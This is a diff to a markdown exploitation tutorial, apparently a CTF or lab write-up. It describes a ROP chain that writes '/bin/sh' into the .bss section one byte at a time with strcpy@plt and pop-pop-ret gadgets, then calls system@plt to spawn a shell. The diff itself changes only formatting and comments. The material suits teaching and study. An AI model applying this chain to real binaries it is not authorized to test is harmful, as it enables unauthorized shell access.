@@ -141,7 +141,7 @@ From the C manual we see that strcpy function goes as follows:
 
 > "The strcpy() function copies the string pointed by source (including the null character) to the character array destination." 
 
-char* strcpy(char* destination, const char* source);
+> "char* strcpy(char* destination, const char* source);
 
 So the plan here is to create our string "/bin/sh" byte-by-byte into a memory which is writable. That's why i chose an address from .bss section because it is unaffected from ASLR and it has pleny of space to store our string.
 
@@ -223,13 +223,16 @@ strcpy@plt + pop_pop_ret_gadget  + (bss + 3) + "n"
 strcpy@plt + pop_pop_ret_gadget  + (bss + 4) + "/"
 strcpy@plt + pop_pop_ret_gadget  + (bss + 5) + "s"
 strcpy@plt + pop_pop_ret_gadget  + (bss + 6) + "h"
-system@plt + AAAA (ret_addr) + bss # AAAA as a ret_addr because we don't actually care where system is going to return to when is finished and we are using the initial address of bss because now contains the whole string "/bin/sh"
+system@plt + AAAA (ret_addr) + bss 
 ```
+If you noticed i put "AAAA" (4-bytes) as a ret_addr because we don't actually care where system is going to return to when is finished and we are using the initial address of bss because now contains the whole string "/bin/sh".
+
 That's it.
 
 
 ## References
 
 [How plt and got works](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
+
 [ROPgadget tool](https://github.com/JonathanSalwan/ROPgadget)
-[
+
